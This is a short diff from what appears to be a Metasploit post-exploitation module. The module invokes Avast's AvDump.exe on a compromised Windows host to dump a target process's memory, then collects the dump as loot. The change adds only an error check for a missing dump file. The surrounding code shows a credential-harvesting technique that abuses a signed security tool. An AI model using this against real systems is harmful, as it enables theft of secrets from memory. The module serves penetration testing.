@@ -37,6 +37,7 @@ class MetasploitModule < Msf::Post
     print_status("Executing Avast mem dump utility against #{pid} to #{dump_path}")
     result = cmd_exec("C:\\Program Files\\Avast Software\\Avast\\AvDump.exe --pid #{pid} --exception_ptr 0 --thread_id 0 --dump_file \"#{dump_path}\" --min_interval 0")
 
+    fail_with(Failure::Unknown, "Dump file #{dump_path} was not created") unless file_exist?(dump_path)
     print_status(dump_path)
     mem_file = read_file(dump_path)
     store_loot("host.avast.memdump", "binary/db", session, mem_file)
